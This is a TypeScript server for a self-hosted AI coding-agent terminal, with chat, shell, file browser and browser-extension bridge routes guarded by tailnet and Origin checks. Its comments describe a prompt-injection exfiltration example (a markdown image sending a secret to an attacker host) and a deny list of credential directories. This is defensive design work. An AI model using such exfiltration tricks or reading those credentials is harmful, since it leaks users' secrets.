import express from "express";
import { WebSocketServer, type WebSocket } from "ws";
import { createServer, type IncomingMessage } from "node:http";
import { mkdirSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import type { ClientEvent } from "./protocol.js";
import { Manager } from "./conversation.js";
import { BrowserBridge } from "./browser.js";
import * as files from "./files.js";
import { wantsContext } from "./prompt.js";
import { pruneScreenshots } from "./screenshots.js";
import { UsageLog } from "./usage.js";
import { WatchRegistry } from "./watches.js";
import { PromptStore, hostOf, fill } from "./prompts.js";
import { resolveProject } from "./projects.js";
import { ZipFile } from "yazl";
import { stat } from "node:fs/promises";
import type { LiveChat } from "./conversation.js";
import { Shell } from "./shell.js";
import { heartbeat } from "./heartbeat.js";
import { whois, self as tailnetSelf, normaliseIp, isLoopback, isLoopbackHost } from "./tailnet.js";
import { parseTrustedCidrs, ipInAny, type Cidr } from "./cidr.js";

const HERE = dirname(fileURLToPath(import.meta.url));
const ROOT = join(HERE, "..");

const HOST = process.env.CODETERM_HOST ?? "127.0.0.1";
const PORT = Number(process.env.CODETERM_PORT ?? 8123);
const WORKSPACE = process.env.CODETERM_WORKSPACE ?? join(ROOT, "workspace");
// The shell pane is already a full shell as this user, so scoping the file
// browser tighter than that would be theatre. Root is configurable; it opens
// in the workspace.
const FILES_ROOT = process.env.CODETERM_FILES_ROOT ?? "/home/dev";
const MAX_UPLOAD = Number(process.env.CODETERM_MAX_UPLOAD ?? 100 * 1024 * 1024);
const MAX_ZIP = Number(process.env.CODETERM_MAX_ZIP ?? 500 * 1024 * 1024);

const EXTRA_ORIGINS = (process.env.CODETERM_ORIGINS ?? "").split(",").map((s) => s.trim()).filter(Boolean);

if (HOST === "0.0.0.0" || HOST === "::") {
  console.error("Refusing to bind all interfaces. /pty is an ungated shell; keep it on the tailnet.");
  process.exit(1);
}
mkdirSync(WORKSPACE, { recursive: true });

/**
 * The file browser opens on the home directory, which holds the credentials
 * that would let someone bill your Claude account or SSH as you. Block those
 * subtrees even though they sit inside the root — a shell can read them, but a
 * one-click download in a browser (and a prompt-injected agent) should not.
 * Extend with CODETERM_DENY (colon-separated absolute paths).
 */
const HOME = process.env.HOME ?? "/home/dev";
const DENY_DEFAULTS = [
  ".claude", ".ssh", ".aws", ".config/gh", ".config/gcloud", ".gnupg",
  ".docker/config.json", ".netrc", ".git-credentials", ".kube",
].map((p) => join(HOME, p));
const DENY_EXTRA = (process.env.CODETERM_DENY ?? "").split(":").map((s) => s.trim()).filter(Boolean);
// The server's own secrets, wherever the project sits.
const DENY_SELF = [join(ROOT, ".env")];
await files.setDeniedPaths([...DENY_DEFAULTS, ...DENY_EXTRA, ...DENY_SELF]);

// The Chrome extension dials in here; browser tools speak through it.
const bridge = new BrowserBridge((line) => console.log(`[ext] ${line}`));

// The most recently opened shell pane. Several tabs can each have one; the
// agent reads the newest, which is the one the user is looking at.
let activeShell: Shell | null = null;

/** Every attached client's list refresher, so a rename shows up everywhere. */
const clients = new Set<() => void>();
/** The chat most recently attached to, used when a shell pane asks for a cwd. */
let lastChat: LiveChat | null = null;
const lastChatCwd = () => lastChat?.cwd ?? WORKSPACE;



// Chats live on disk; only the active one has a running SDK session.
const PROJECTS_ROOT = process.env.CODETERM_PROJECTS_ROOT ?? "/home/dev/projects";
const watches = new WatchRegistry();
const prompts = new PromptStore(process.env.CODETERM_PROMPTS ?? join(ROOT, "prompts.json"));

const convo = new Manager(
  WORKSPACE,
  process.env.CODETERM_CHATS ?? join(ROOT, "chats"),
  PROJECTS_ROOT,
  // prefer is replaced per-chat by LiveChat, which knows its own browser.
  { bridge, getShell: () => activeShell, watches, prompts, prefer: () => undefined },
);
convo.onListChanged = () => { for (const f of clients) f(); };

convo.onChatRemoved = (id) => {
  const n = watches.removeForChat(id);
  if (n) console.log(`[watch] dropped ${n} watch(es) with the deleted chat`);
};

/**
 * A watch reported. Wake the chat that set it, if that chat is the one running;
 * otherwise leave it on the list for `watch list` to report.
 */
bridge.onEvent((msg) => {
  if (msg.type !== "watch_fired") return;
  const id = String(msg.watchId ?? "");
  const detail = String(msg.detail ?? "something changed");
  const w = watches.fire(id, detail);
  if (!w) return;
  console.log(`[watch] fired: ${detail}`);
  // Route it to the conversation that set it. If that chat is no longer live
  // the watch stays on the list for `watch list` to report.
  const chat = convo.live(w.chatId);
  if (!chat) { console.log(`[watch] its chat is not live; left on the list`); return; }
  // The detail is page-derived (title/url from the extension), so it goes in
  // the untrusted block rather than inline in the instruction — the same rule
  // composePrompt applies to tab context. The description is the model's own
  // words from when it set the watch.
  chat.watchFired(
    w.description,
    detail,
    `A page watch you set has fired. You were waiting for: ${w.description}. ` +
      `The page's report is in the untrusted block above. Tell the user, briefly. ` +
      `Do not re-set the watch unless asked.`,
  );
});

// Expired and long-fired watches should not clutter the list forever.
setInterval(() => {
  for (const w of watches.sweep()) {
    void bridge.send("watch_stop", { watchId: w.id }).catch(() => {});
  }
}, 60_000).unref();

/**
 * Two ways to run:
 *
 *   tailnet mode    — a tailnet identity is found; non-loopback peers are
 *                     authenticated by `tailscale whois`. This is the VPS.
 *   localhost mode  — no identity (tailscale absent, or CODETERM_LOCALHOST=1);
 *                     the server serves this machine only. A laptop with no
 *                     tailnet runs here with zero setup.
 *
 * The one rule that keeps localhost mode safe: it must be bound to loopback. A
 * network-reachable bind with no identity would be an ungated shell with no
 * authentication at all, so that combination refuses to start.
 */
const FORCE_LOCAL = process.env.CODETERM_LOCALHOST === "1";
const SELF: { userId: number; dnsName: string } | null =
  FORCE_LOCAL ? null : await tailnetSelf();

/**
 * Extra peer addresses to trust like loopback — for a non-tailscale VPN
 * (WireGuard, etc.): bind the tunnel interface and trust its subnet. Every
 * entry must be a private range; a public one is refused here so a typo cannot
 * open the shell to the internet.
 */
let TRUSTED_CIDRS: Cidr[];
try {
  TRUSTED_CIDRS = parseTrustedCidrs(process.env.CODETERM_TRUSTED_CIDRS);
} catch (e) {
  console.error(e instanceof Error ? e.message : String(e));
  process.exit(1);
}

// A non-loopback bind needs *some* authenticator: a tailnet identity, or a
// trusted-CIDR allowlist. Without either it would be an ungated shell reachable
// with no authentication, so refuse.
if (!SELF && !isLoopbackHost(HOST) && TRUSTED_CIDRS.length === 0) {
  console.error(
    FORCE_LOCAL
      ? "CODETERM_LOCALHOST=1 serves this machine only, so it needs a loopback bind."
      : "No tailnet identity (`tailscale status --json` failed), and not bound to loopback.",
  );
  console.error("Refusing to start: that would be an ungated shell reachable with no authentication.");
  console.error("Fixes: run tailscale · CODETERM_HOST=127.0.0.1 for localhost only ·");
  console.error("       or CODETERM_TRUSTED_CIDRS=<your VPN subnet> and bind the tunnel interface.");
  process.exit(1);
}
const LOCALHOST_ONLY = !SELF && TRUSTED_CIDRS.length === 0;

/**
 * Origins a browser may legitimately be on. A cross-origin page gets rejected
 * here — WebSockets have no same-origin policy of their own, so without this
 * any site you visit could open /pty. In localhost mode there is no tailnet
 * dnsName; localhost/127.0.0.1 (always present) cover it.
 */
const ALLOWED_ORIGINS = new Set(
  [HOST, SELF?.dnsName, SELF?.dnsName?.split(".")[0], "localhost", "127.0.0.1", ...EXTRA_ORIGINS]
    .filter(Boolean)
    .flatMap((h) => [`http://${h}:${PORT}`, `https://${h}:${PORT}`]),
);

/**
 * Two independent checks, both must pass:
 *   origin  — blocks a malicious page in your own browser
 *   whois   — blocks any device that isn't your tailnet identity
 * Returns null when allowed, or a reason string when denied.
 */
async function denyReason(req: IncomingMessage, route: string): Promise<string | null> {
  const origin = req.headers.origin;

  // A chrome-extension:// origin can never be a page on a website, so the
  // cross-site concern the Origin check exists for does not apply. This covers
  // the /ext bridge and the side panel, which opens /ws from an extension page.
  // Pin a specific id with CODETERM_EXT_ORIGIN.
  if (typeof origin === "string" && origin.startsWith("chrome-extension://")) {
    const pinned = process.env.CODETERM_EXT_ORIGIN;
    if (pinned && origin !== pinned) return `extension ${origin} is not the pinned one`;
    return identityReason(req);
  }
  // A simple cross-site request (an <img>, a <form> GET, a <script>) carries no
  // Origin, so the check above never sees it — yet it still issues from the
  // authorised browser. Sec-Fetch-Site closes that gap: the browser sets it,
  // page JS cannot forge it, and "cross-site" is exactly the case to refuse.
  // Same-origin/same-site requests and non-browser clients (which omit it) pass.
  const site = req.headers["sec-fetch-site"];
  if (site === "cross-site") return "cross-site request";

  // Non-browser clients (curl, scripts) send no Origin. A browser always does,
  // so allowing absence costs nothing against the cross-site vector.
  if (typeof origin === "string" && !ALLOWED_ORIGINS.has(origin)) {
    return `origin ${origin}`;
  }

  return identityReason(req);
}

/** whois half of the check, shared by every route. */
async function identityReason(req: IncomingMessage): Promise<string | null> {
  const ip = normaliseIp(req.socket.remoteAddress ?? "");
  if (!ip) return "no peer address";
  if (isLoopback(ip)) return null; // same box — already has a shell
  if (ipInAny(ip, TRUSTED_CIDRS)) return null; // an explicitly trusted VPN subnet

  // With no tailnet identity there is nothing to authenticate a remote peer
  // against beyond the trusted-CIDR list just checked, so refuse the rest.
  if (!SELF) return "localhost-only mode: only same-machine and trusted-CIDR connections are allowed";

  const who = await whois(ip, req.socket.remotePort ?? 0);
  if (!who) return `${ip} is not on this tailnet`;
  if (who.userId !== SELF.userId) return `${who.loginName} is not the owner`;
  return null;
}

const app = express();

/**
 * Content-Security-Policy on every response.
 *
 * The transcript renders model replies as HTML, and model replies are shaped by
 * untrusted page content, so a hostile page can smuggle an instruction that
 * makes a reply embed `![x](http://attacker/px?d=<secret>)`. DOMPurify strips
 * scripts and event handlers, so injected markup cannot run code — it can only
 * auto-load a subresource. Locking img/media/font/connect to our own origin
 * closes that exfiltration channel: an off-origin pixel simply never fires.
 *
 *   img/media  'self' data: blob:  — same-origin assets, inline data URIs, and
 *                                    the blob: URLs the file viewer builds
 *   connect    'self'              — the /ws and /pty sockets are same-origin;
 *                                    an injected fetch to attacker.example dies
 *   script     'unsafe-inline'     — the pages carry one inline bootstrap each;
 *                                    every real dependency is a same-origin
 *                                    /vendor file, so this only permits our own
 *                                    inline block, not injected script (which
 *                                    DOMPurify already removes)
 */
const CSP = [
  "default-src 'self'",
  "script-src 'self' 'unsafe-inline'",
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: blob:",
  "media-src 'self' data: blob:",
  "font-src 'self' data:",
  "connect-src 'self'",
  "object-src 'none'",
  "frame-src 'none'",
  "base-uri 'none'",
  "form-action 'self'",
].join("; ");

app.use((_req, res, next) => {
  res.setHeader("Content-Security-Policy", CSP);
  res.setHeader("X-Content-Type-Options", "nosniff");
  // same-origin, not no-referrer: manage.html reads document.referrer to send a
  // phone back to /m.html, and that is a same-origin hop. Cross-origin
  // navigations still leak nothing.
  res.setHeader("Referrer-Policy", "same-origin");
  next();
});

/**
 * Same two checks as a WebSocket upgrade. Static assets stay open — they are
 * inert without a session — but anything touching the filesystem does not.
 */
const guard: express.RequestHandler = (req, res, next) => {
  denyReason(req, "/files").then((deny) => {
    if (!deny) return next();
    console.warn(`[deny] ${req.method} ${req.path} — ${deny}`);
    res.status(403).json({ error: deny });
  }).catch((e) => res.status(500).json({ error: String(e) }));
};

/**
 * Which prompts apply right now. The active tab is resolved here rather than
 * in the client, so the plain web UI — which has no idea what your browser is
 * showing — gets the same domain-scoped list as the side panel.
 */
/**
 * Chat management over HTTP, for the manage page. The websocket carries the
 * live list for the running UI; this is for curation, which does not need a
 * session open.
 */
app.get("/chats", guard, (_req, res) => {
  res.json({ projects: convo.projects(), chats: convo.list() });
});

/** One chat's transcript, so the manage page is not renaming things blind. */
app.get("/chats/:id", guard, (req, res) => {
  const rec = convo.read(String(req.params.id));
  if (!rec) { res.status(404).json({ error: "no such chat" }); return; }
  res.json(rec);
});

app.post("/chats/:id", guard, express.json({ limit: "64kb" }), async (req, res) => {
  try {
    const id = String(req.params.id);
    const b = req.body as { title?: string; project?: string; open?: boolean };
    if (typeof b.title === "string") {
      const chat = convo.get(id);
      if (!chat?.rename(b.title)) throw new Error("no such chat");
    }
    if (typeof b.project === "string") {
      const chat = convo.get(id);
      if (!chat) throw new Error("no such chat");
      await chat.setProject(resolveProject(convo.projects(), b.project));
    }
    // "open in the terminal": a fresh attach lands on the newest chat, so make
    // this one the newest. The flag used to be accepted and ignored, and the
    // redirect landed on whichever chat happened to be most recent.
    if (b.open === true) {
      const chat = convo.get(id);
      if (!chat) throw new Error("no such chat");
      chat.touch();
    }
    res.json({ ok: true });
  } catch (e) {
    res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
  }
});

app.delete("/chats/:id", guard, async (req, res) => {
  try {
    convo.remove(String(req.params.id));
    res.json({ ok: true });
  } catch (e) {
    res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
  }
});

/* Which controls actually get used. Local file, never leaves this box; it
   exists so the navigation bar can be ordered from measurement next time
   rather than from priors. */
const usage = new UsageLog(new URL("../usage.json", import.meta.url).pathname);

app.post("/usage", guard, express.json({ limit: "1kb" }), (req, res) => {
  res.json({ ok: usage.record(String((req.body as { control?: unknown })?.control ?? "")) });
});

app.get("/usage", guard, (_req, res) => {
  res.json({ counts: usage.counts() });
});

app.get("/projects", guard, (_req, res) => {
  res.json({ projects: convo.projects() });
});

app.get("/prompts", guard, async (_req, res) => {
  const tab = (await bridge.activeTab()) ?? {};
  const host = hostOf(tab.url);
  res.json({
    host,
    url: tab.url ?? "",
    title: tab.title ?? "",
    hasSelection: Boolean(tab.selection),
    prompts: prompts.for(host).map((p) => ({ ...p, filled: fill(p.text, tab) })),
    all: prompts.all(),
  });
});

app.post("/prompts", guard, express.json({ limit: "256kb" }), (req, res) => {
  try {
    const b = req.body as { id?: string; title?: string; text?: string; domains?: string[] };
    res.json(prompts.upsert({ id: b.id, title: String(b.title ?? ""), text: String(b.text ?? ""), domains: b.domains ?? [] }));
  } catch (e) {
    res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
  }
});

app.delete("/prompts/:id", guard, (req, res) => {
  res.json({ removed: prompts.remove(String(req.params.id)) });
});

app.get("/files/info", guard, async (_req, res) => {
  // Where the browser should open: the agent's workspace when it sits under
  // the browsable root, else the root itself.
  let start = "";
  try { start = files.toRel(FILES_ROOT, await files.safePath(FILES_ROOT, WORKSPACE)); } catch { start = ""; }
  res.json({ root: FILES_ROOT, start, maxUpload: MAX_UPLOAD, cwd: lastChatCwd() });
});

app.get("/files/list", guard, async (req, res) => {
  try {
    res.json(await files.list(FILES_ROOT, typeof req.query.path === "string" ? req.query.path : undefined));
  } catch (e) {
    res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
  }
});

app.get("/files/read", guard, async (req, res) => {
  try {
    const path = String(req.query.path ?? "");
    const f = await files.statFile(FILES_ROOT, path);
    if (req.query.preview === "1") {
      const t = await files.readTextPreview(f.abs, 256 * 1024);
      res.json(t ? { kind: "text", name: f.name, ...t } : { kind: "binary", name: f.name, bytes: f.size });
      return;
    }
    // Let the browser name the download; the client also sets its own.
    res.setHeader("Content-Disposition", `attachment; filename="${encodeURIComponent(f.name)}"`);
    res.setHeader("Content-Length", String(f.size));
    files.streamFile(f.abs).pipe(res);
  } catch (e) {
    res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
  }
});

/**
 * Zip a selection. Streamed straight to the response rather than written to a
 * temp file: the whole point is to hand over a large selection, and nothing
 * needs it on disk.
 */
app.post("/files/zip", guard, express.json({ limit: "256kb" }), async (req, res) => {
  try {
    const b = req.body as { path?: string; names?: string[] };
    const names = Array.isArray(b.names) ? b.names.filter((n) => typeof n === "string") : [];
    if (!names.length) throw new Error("nothing selected");

    const { entries, bytes } = await files.collectForZip(FILES_ROOT, b.path, names, MAX_ZIP);
    if (!entries.length) throw new Error("nothing to zip — the selection held no files");

    const stem = names.length === 1 ? names[0].replace(/\W+/g, "-") : "selection";
    res.setHeader("Content-Type", "application/zip");
    res.setHeader("Content-Disposition", `attachment; filename="${stem}.zip"`);
    console.log(`[zip] ${entries.length} file(s), ${(bytes / 1024).toFixed(0)}KB`);

    const zip = new ZipFile();
    for (const e of entries) zip.addFile(e.abs, e.name);
    zip.outputStream.pipe(res);
    zip.end();
  } catch (e) {
    // If the stream already started, a JSON error would corrupt the zip.
    if (res.headersSent) { res.destroy(); return; }
    res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
  }
});

// Streamed to disk. express.raw() held the whole body in memory — up to
// MAX_UPLOAD (100 MB) per request — which is the same OOM shape as the old
// file preview, just on the write side.
app.post("/files/upload", guard, async (req, res) => {
  try {
    const name = String(req.query.name ?? "");
    const dir = typeof req.query.path === "string" ? req.query.path : undefined;
    if (!name) throw new Error("missing ?name=");
    res.json(await files.saveUploadStream(FILES_ROOT, dir, name, req, MAX_UPLOAD));
  } catch (e) {
    res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
  }
});

/* The mobile page shares the side panel's script and stylesheet verbatim.
   MV3 forbids remote code, so the extension must load them from disk — serving
   those same two files here keeps mobile and the panel from drifting apart
   instead of maintaining a second copy. */
app.get("/m/app.js", (_req, res) => res.type("js").sendFile(join(ROOT, "extension/sidepanel.js")));
app.get("/m/panel.css", (_req, res) => res.type("css").sendFile(join(ROOT, "extension/panel.css")));
/* Bare /m is what you type on a phone. */
app.get("/m", (_req, res) => res.redirect(302, "/m.html"));

app.use(express.static(join(ROOT, "public")));
app.use("/vendor/xterm", express.static(join(ROOT, "node_modules/@xterm/xterm")));
app.use("/vendor/addon-fit", express.static(join(ROOT, "node_modules/@xterm/addon-fit")));
app.use("/vendor/addon-web-links", express.static(join(ROOT, "node_modules/@xterm/addon-web-links")));
app.use("/vendor/marked", express.static(join(ROOT, "node_modules/marked/lib")));
app.use("/vendor/dompurify", express.static(join(ROOT, "node_modules/dompurify/dist")));

const server = createServer(app);
// Default maxPayload is 100 MB, JSON.parsed in one go. The largest legitimate
// frame is a screenshot data URL over /ext (a few MB); 32 MB leaves headroom.
const wss = new WebSocketServer({ noServer: true, maxPayload: 32 * 1024 * 1024 });

server.on("upgrade", async (req, socket, head) => {
  const route = new URL(req.url ?? "/", `http://${req.headers.host}`).pathname;
  if (route !== "/ws" && route !== "/pty" && route !== "/ext") {
    socket.write("HTTP/1.1 404 Not Found\r\n\r\n");
    socket.destroy();
    return;
  }

  const deny = await denyReason(req, route);
  if (deny) {
    console.warn(`[deny] ${route} — ${deny}`);
    socket.write("HTTP/1.1 403 Forbidden\r\n\r\n");
    socket.destroy();
    return;
  }

  wss.handleUpgrade(req, socket, head, (ws) => {
    heartbeat(ws);
    if (route === "/ws") attachAgent(ws, new URL(req.url ?? "/", "http://x").searchParams.get("observe") !== "1");
    else if (route === "/ext") bridge.attach(ws);
    else attachShell(ws);
  });
});

/**
 * Every attached client picks its own conversation, so two browsers can hold
 * two different chats at once. Before this there was a single active chat and
 * every screen showed it.
 */
function attachAgent(ws: WebSocket, replay = true): void {
  const send = (e: ClientEvent) => { if (ws.readyState === ws.OPEN) ws.send(JSON.stringify(e)); };

  // Land on the most recent chat; the client can switch immediately.
  const startId = convo.newestId();
  let chat: LiveChat = (startId && convo.get(startId)) || convo.create();
  let clientBrowser: string | undefined;
  lastChat = chat;

  const listFor = () => send({ kind: "chats", chats: convo.list(), activeId: chat.id });
  const enter = (next: LiveChat, clear: boolean) => {
    chat.detach(send);
    chat = next;
    lastChat = next;
    next.useBrowser(clientBrowser);
    if (clear) send({ kind: "cleared" });
    next.attach(send, true);
    listFor();
    send({ kind: "mode", mode: convo.mode });
    const p = next.project(convo.projects());
    send({ kind: "project", id: p.id, name: p.name });
  };

  chat.attach(send);
  listFor();
  send({ kind: "mode", mode: convo.mode });
  {
    const p = chat.project(convo.projects());
    send({ kind: "project", id: p.id, name: p.name });
  }

  ws.on("message", (raw) => {
    let msg: { type?: string; text?: string; id?: string; decision?: string; mode?: string;
               answers?: unknown; withTab?: boolean; path?: string; title?: string;
               instance?: string };
    try { msg = JSON.parse(raw.toString()); } catch { return; }

    switch (msg.type) {
      case "prompt": {
        if (typeof msg.text !== "string" || !msg.text.trim()) return;
        if (chat.busy) { send({ kind: "error", message: "Still working — press Stop first." }); return; }
        const text = msg.text;
        const target = chat;
        // Bind the browser at send time, not at attach time: two clients can
        // start on the same chat, and the last to attach would otherwise
        // capture it. Whoever is driving decides where the tools act.
        target.useBrowser(clientBrowser);
        const attach = msg.withTab !== false && wantsContext(text);
        void (attach ? bridge.activeTab(target.extInstance) : Promise.resolve(null)).then((tab) => {
          const context = tab?.url
            ? [`active tab: ${tab.title ?? "(untitled)"} — ${tab.url}`,
               tab.selection ? `selected text:\n${tab.selection}` : null].filter(Boolean).join("\n")
            : undefined;
          target.recordUser(text, context);
          target.session.send(text, context);
        });
        return;
      }

      // Which browser this client is in. Applies to the chat it is on, and to
      // any it switches to, so the tools follow the person.
      case "browser":
        if (typeof msg.instance === "string") { clientBrowser = msg.instance; chat.useBrowser(clientBrowser); }
        return;

      case "answer":
        if (typeof msg.id === "string" && msg.answers && typeof msg.answers === "object") {
          chat.session.answer(msg.id, msg.answers as Record<string, string>);
        }
        return;

      case "decision":
        if (typeof msg.id === "string" &&
            (msg.decision === "allow" || msg.decision === "always" || msg.decision === "deny")) {
          chat.session.decide(msg.id, msg.decision);
        }
        return;

      case "cwd": {
        if (typeof msg.path !== "string") return;
        const target = chat;
        files.safePath(FILES_ROOT, msg.path)
          .then(async (abs) => {
            const st = await stat(abs);
            if (!st.isDirectory()) throw new Error("not a directory");
            await target.setCwd(abs);
          })
          .catch((e: unknown) => send({ kind: "error", message: e instanceof Error ? e.message : String(e) }));
        return;
      }

      case "project":
        if (typeof msg.id === "string") {
          chat.setProject(resolveProject(convo.projects(), msg.id))
            .catch((e: unknown) => send({ kind: "error", message: e instanceof Error ? e.message : String(e) }));
        }
        return;

      case "mode":
        if (msg.mode === "default" || msg.mode === "acceptEdits" || msg.mode === "auto" ||
            msg.mode === "plan" || msg.mode === "dontAsk" || msg.mode === "bypassPermissions") {
          convo.setMode(msg.mode)
            .then(() => send({ kind: "mode", mode: convo.mode }))
            .catch((e: unknown) => send({ kind: "error", message: String(e) }));
        }
        return;

      case "interrupt":
        chat.session.interrupt().catch(() => {});
        return;

      case "new":
        enter(convo.create(chat), true);
        return;

      // Switches THIS client only. Another browser keeps whatever it was on.
      case "open": {
        if (typeof msg.id !== "string" || msg.id === chat.id) return;
        const next = convo.get(msg.id);
        if (next) enter(next, true);
        return;
      }

      case "rename":
        if (typeof msg.id === "string" && typeof msg.title === "string") {
          convo.get(msg.id)?.rename(msg.title);
        }
        return;

      case "delete":
        if (typeof msg.id === "string") {
          const removingCurrent = msg.id === chat.id;
          convo.remove(msg.id);
          if (removingCurrent) {
            const nextId = convo.newestId();
            enter((nextId && convo.get(nextId)) || convo.create(), true);
          } else listFor();
        }
        return;
    }
  });

  const detach = () => { chat.detach(send); clients.delete(refresh); };
  ws.on("close", detach);
  ws.on("error", detach);

  // Keep every client's chat list current when a title or project changes.
  const refresh = () => listFor();
  clients.add(refresh);
}

/** The shell: a real PTY, no approval gate. */
function attachShell(ws: WebSocket): void {
  const shell: Shell = new Shell(
    (chunk) => { if (ws.readyState === ws.OPEN) ws.send(Buffer.from(chunk, "utf8"), { binary: true }); },
    (code) => {
      if (ws.readyState === ws.OPEN) ws.send(JSON.stringify({ type: "exit", code }));
      ws.close();
    },
  );

  activeShell = shell;

  ws.on("message", (raw, isBinary) => {
    if (isBinary) { shell.write(raw.toString("utf8")); return; }
    let msg: { type?: string; data?: string; cols?: number; rows?: number };
    try { msg = JSON.parse(raw.toString()); } catch { return; }
    switch (msg.type) {
      // The shell opens where the chat works, so both panes agree.
      // The shell opens where the newest attached chat works.
      case "start":  shell.start(lastChatCwd(), msg.cols ?? 80, msg.rows ?? 24); return;
      case "input":  if (typeof msg.data === "string") shell.write(msg.data); return;
      case "resize": shell.resize(msg.cols ?? 80, msg.rows ?? 24); return;
    }
  });

  const close = () => {
    // Only clear it if a newer pane has not already taken over.
    if (activeShell === shell) activeShell = null;
    shell.kill();
  };
  ws.on("close", close);
  ws.on("error", close);
}

/**
 * At boot this can start before tailscaled has assigned the address, and
 * binding a not-yet-existent IP fails with EADDRNOTAVAIL. Retry rather than
 * die, so the unit does not need to guess at ordering — this also covers
 * tailscale restarting or the address changing under us.
 */
function listenWithRetry(attempt = 0): void {
  const onError = (err: NodeJS.ErrnoException) => {
    const retryable = err.code === "EADDRNOTAVAIL" || err.code === "EADDRINUSE";
    if (!retryable) throw err;
    const wait = Math.min(30_000, 1000 * 2 ** Math.min(attempt, 5));
    console.warn(`bind ${HOST}:${PORT} failed (${err.code}); retrying in ${wait / 1000}s`);
    server.removeListener("error", onError);
    setTimeout(() => listenWithRetry(attempt + 1), wait);
  };
  server.once("error", onError);
  server.listen(PORT, HOST, () => {
    server.removeListener("error", onError);
    announce();
  });
}

function announce(): void {
  console.log(`code-terminal  http://${HOST}:${PORT}`);
  console.log(`identity       ${SELF ? `${SELF.dnsName} · tailnet user ${SELF.userId}` : "no tailnet identity"}`);
  console.log(`workspace      ${WORKSPACE}`);
  console.log(`shell          /pty — real PTY, NO approval gate`);
  console.log(`browser        /ext — extension bridge, tools ungated`);
  console.log(`files          ${FILES_ROOT} (browse, upload, download)`);
  console.log(`projects       ${PROJECTS_ROOT}`);
  console.log(`origins        ${[...ALLOWED_ORIGINS].join("  ")}`);
  if (LOCALHOST_ONLY) {
    console.log(`mode           localhost only — reachable from this machine, not the network`);
  } else if (!SELF) {
    console.log(`mode           trusted-CIDR only — no tailnet; peers authenticated by CODETERM_TRUSTED_CIDRS`);
  }
  if (TRUSTED_CIDRS.length) {
    console.log(`trusted        ${process.env.CODETERM_TRUSTED_CIDRS} (treated like loopback)`);
  }
}

// A restart is a good moment to drop what the previous run left behind.
void pruneScreenshots().then((n) => { if (n) console.log(`[shots] pruned ${n} old screenshots`); });

listenWithRetry();
